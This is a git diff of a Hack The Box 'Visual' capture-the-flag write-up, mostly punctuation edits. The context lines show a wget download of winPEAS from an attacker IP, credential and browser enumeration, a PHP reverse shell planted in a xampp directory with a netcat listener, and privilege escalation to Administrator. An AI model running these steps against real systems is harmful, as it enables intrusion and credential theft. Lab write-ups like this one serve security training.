@@ -221,11 +221,11 @@ wget http://10.10.14.222:8000/winPEASany.exe -o wpany.exe
 
 > Use your IP address and replace the port by the one you are using for your server
 
-Verify that the file is on the target
+Verify that the file is on the target.
 
 ![winPEAS location on target](/images/HTB-Visual/winPEAS-on-target.png)
 
-You can check the options of winPEAS with `./wpany.exe -h`
+You can check the options of winPEAS with `./wpany.exe -h`.
 
 ![winPEAS options](/images/HTB-Visual/winpeas-options.png)
 
@@ -234,7 +234,7 @@ Run it with the options you want, Because I want a somewhat thorough enumeration
 ./wpany.exe domain systeminfo userinfo processinfo servicesinfo applicationsinfo networkinfo windowscreds browserinfo filesinfo eventsinfo quiet
 ```
 
-It seems that we have permissions to the directory containing the Apache HTTP Server service
+It seems that we have permissions to the directory containing the Apache HTTP Server service.
 
 ![Apache Server HTTP](/images/HTB-Visual/ApacheServerHTTP.png)
 
@@ -247,11 +247,11 @@ We can attempt to learn more about `ApacheHTTPServer` with
 Get-CIMInstance -Class Win32_Service -Filter "Name='ApacheHTTPServer'" | Select-Object *
 ```
 
-This is the output we get, it seems like it runs under `NT AUTHORITY\Local Service`
+This is the output we get, it seems like it runs under `NT AUTHORITY\Local Service`.
 
 ![Apache HTTP Server service info](/images/HTB-Visual/AppacheHTTPServer-info-1.png)
 
-> "On Windows 10, the UPnP Device Host service is configured to execute without impersonation privileges as the user `NT AUTHORITY\LOCAL SERVICE`...". Basically we can achieve privilege escalation via this account. Read more about it [here](https://itm4n.github.io/localservice-privileges/)
+> "On Windows 10, the UPnP Device Host service is configured to execute without impersonation privileges as the user `NT AUTHORITY\LOCAL SERVICE`...". Basically we can achieve privilege escalation via this account. Read more about it [here](https://itm4n.github.io/localservice-privileges/).
 
 The service runs under `NT AUTHORITY\Local Service` so we need to escalate to that account. Since we have access to the `xampp` directory we can plant a reverse shell there and access it through the web browser. I go to that directory and list its content.
 
@@ -282,13 +282,13 @@ Let's setup a netcat listener with
 nc -nvlp 8010
 ```
 
-> Use the port number that you specified in the PHP reverse shell
+> Use the port number that you specified in the PHP reverse shell.
 
-Go back to the browser and go to `http://<IP address>/rev.php`, come back to your listener and you should have a shell with the user `nt authority\local service`
+Go back to the browser and go to `http://<target IP address>/rev.php`, come back to your listener and you should have a shell with the user `nt authority\local service`.
 
 ![nt authority user shell on the target](/images/HTB-Visual/nt-authority-local-service.png)
 
-Check your privileges and you notice that you lack the `ImpersonatePrivilege` needed to get root privileges.
+Check your privileges and you notice that you lack the `ImpersonatePrivilege` needed to get administrative privileges.
 
 Let's run `whoami /priv`.
 
@@ -344,7 +344,7 @@ We now have admin privileges, let's check.
 cd C:\Users\Administrator\Desktop
 ```
 
-Then let's list the content of the directory, we got downgraded to a cmd shell again so we have to use `dir` .
+Then let's list the content of the directory, we got downgraded to a cmd shell again so we have to use `dir`.
 
 ![root flag](/images/HTB-Visual/root-flag.png)
 
